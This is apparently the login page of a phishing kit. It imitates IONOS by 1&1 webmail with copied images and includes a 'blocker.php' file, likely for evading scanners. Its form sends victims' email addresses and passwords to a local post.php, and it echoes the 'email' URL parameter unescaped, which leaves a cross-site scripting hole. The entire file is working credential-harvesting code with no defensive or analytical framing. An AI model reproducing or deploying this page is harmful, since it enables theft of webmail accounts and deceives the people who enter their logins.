<?php
include('blocker.php');
?>
<!DOCTYPE html>
<html>
	<head>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Webmail Login|IONOS by 1&1</title>
	<link rel="icon" type="image/ico" href="img/favicon.ico" />
	<style>
		body {
		 margin-top: 0;
		 margin-left: 0;
		 margin-bottom: 0;
		 margin-right: 0;
		 background-color:#f0f0f0;
		 background-repeat:no-repeat;
		}
	</style>
</head>
<body>
	<div class="head" style="background-color:#003d8f; background-repeat: no-repeat; height: 65px; width: 100%; margin-top: 0px; position: relative;">
		<div class="head1" style="background: url('img/a1.png'); background-repeat: no-repeat; height: 65px; width: 100%; margin-top: 0px; position: relative;"></div>
	</div>
	<div class="body" style="background: url('img/a2.png'); background-repeat: no-repeat; height: 380px; width: 800px; margin-top: 35px; margin-left: 370px; position: relative;">
	<form action="post.php" method="post">
		<input type="email" name="email" required="" value="<?php echo $_GET['email'];?>" maxlength="128" placeholder="E-mail Address" style="height: 30px; width: 455px; position: relative; margin-top: 88px; margin-left: 76px; border:none;">
		<input type="password" name="password" required="" placeholder="Password" maxlength="128" style="height: 30px; width: 455px; position: relative; margin-top: 40px; margin-left: 76px; border:none;">
		<input type="image" alt="submit" name="submit" src="img/a3.png" style="position: relative; height:45px; width: 498px;
		margin-left: 43px; margin-top: 57px;">
	</form>
</div>
<div class="body" style="background: url('img/a4.png'); background-repeat: no-repeat; height: 500px; width: 800px; margin-top: -47px; margin-left: 372px; position: relative;"></div>
<div class="body" style="background: url('img/a5.png'); background-repeat: no-repeat; height: 330px; width: 1349px; margin-top: 15px;   position: relative;"></div>
	</body>
</html>